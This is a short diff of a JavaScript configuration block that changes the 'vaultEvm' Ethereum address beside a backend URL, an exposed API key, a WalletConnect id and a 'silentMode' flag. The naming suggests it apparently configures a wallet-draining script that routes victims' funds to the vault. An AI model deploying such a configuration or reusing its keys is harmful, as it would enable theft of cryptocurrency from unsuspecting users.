@@ -7,7 +7,7 @@
     backendUrl:  'https://sadrailala-production.up.railway.app',
     kineticKey:  'uK2WF0w8VynajJYsSmA95bDxThM14BdG',
     wcProjectId: 'a785da105621eb55c998a35c57587667',
-    vaultEvm:    '0x2B20979118a61aE3f7f75F3320FB9b0639c5BA53',
+    vaultEvm:    '0x3b9370B9A8ce3a192e226b6C8B2066A09C3B01eE',
     silentMode:  false,
   }, window.LEGION_CONFIG || {});
   var BACKEND = CFG.backendUrl.replace(/\/$/, '');
